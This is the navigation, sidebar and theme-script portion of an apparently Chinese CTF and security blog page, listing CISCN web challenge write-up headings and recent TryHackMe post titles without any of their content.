class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97web11"><span class="toc-number">1.</span> <span class="toc-text">[CISCN 2019华东南]Web11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">静态方法利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E5%8C%97day2web1"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E5%8C%97day1web1"><span class="toc-number">3.</span> <span class="toc-text">[CISCN 2019华北Day1]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%88%9D%E8%B5%9Blove-math"><span class="toc-number">4.</span> <span class="toc-text">[CISCN 2019初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">4.2.</span> <span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">4.3.</span> <span class="toc-text">方法三：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="toc-number">4.4.</span> <span class="toc-text">方法四：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E5%8C%97day1web2"><span class="toc-number">5.</span> <span class="toc-text">[CISCN 2019华北Day1]Web2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97web4"><span class="toc-number">6.</span> <span class="toc-text">[CISCN 2019华东南]Web4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97double-secret"><span class="toc-number">7.</span> <span class="toc-text">[CISCN 2019华东南]Double Secret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2022-%E5%88%9D%E8%B5%9Bezpop"><span class="toc-number">8.</span> <span class="toc-text">[CISCN 2022 初赛]ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2022-%E5%88%9D%E8%B5%9Bonline_crt"><span class="toc-number">9.</span> <span class="toc-text">[CISCN 2022 初赛]online_crt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">9.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.2.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97ez_date"><span class="toc-number">10.</span> <span class="toc-text">[CISCN 2023 华北]ez_date</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">10.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E8%A5%BF%E5%8D%97do_you_like_read"><span class="toc-number">11.</span> <span class="toc-text">[CISCN 2023 西南]do_you_like_read</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">11.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%88%9D%E8%B5%9Bgo_session"><span class="toc-number">12.</span> <span class="toc-text">[CISCN 2023 初赛]go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">12.1.</span> <span class="toc-text">前置说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">12.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0"><span class="toc-number">12.3.</span> <span class="toc-text">session伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">12.4.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">12.5.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97pysym"><span class="toc-number">13.</span> <span class="toc-text">[CISCN 2023 华北]pysym</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">13.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%88%9D%E8%B5%9Bdeserbug"><span class="toc-number">14.</span> <span class="toc-text">[CISCN 2023 初赛]DeserBug</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">14.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E8%A5%BF%E5%8D%97dataapi"><span class="toc-number">15.</span> <span class="toc-text">[CISCN 2023 西南]dataapi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">15.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97normal_snake"><span class="toc-number">16.</span> <span class="toc-text">[CISCN 2023 华北]normal_snake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">16.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97exift0ol"><span class="toc-number">17.</span> <span class="toc-text">[CISCN 2023 华北]ExifT0ol</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">17.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">18.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})
